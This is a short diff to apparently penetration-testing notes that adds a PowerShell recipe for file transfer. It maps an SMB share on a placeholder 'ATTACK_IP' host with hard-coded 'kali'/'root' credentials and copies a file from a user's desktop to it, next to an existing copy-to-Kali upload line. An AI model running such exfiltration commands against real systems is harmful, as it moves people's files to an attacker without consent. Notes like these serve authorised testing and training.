@@ -13,3 +13,9 @@ Download:
 Upload: 
     
     copy notes.txt \\<Kali-IP>\<share_name>\
+
+#### Powershell
+
+    New-SmbMapping -RemotePath '\\\\ATTACK_IP\\share' -Username "kali" -Password "root" -LocalPath 'F:'
+    cd F:
+    cp C:\\Users\\USER\\Desktop\\file.txt ./
